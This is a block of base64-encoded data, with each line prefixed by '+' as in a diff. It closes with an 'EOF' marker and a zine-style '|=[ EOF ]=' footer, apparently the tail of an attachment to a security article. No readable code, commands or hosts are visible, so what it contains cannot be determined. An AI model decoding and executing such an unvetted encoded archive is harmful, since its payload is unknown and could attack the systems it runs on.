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
+IA
+EOF
+
+|=[ EOF ]=---------------------------------------------------------------=|
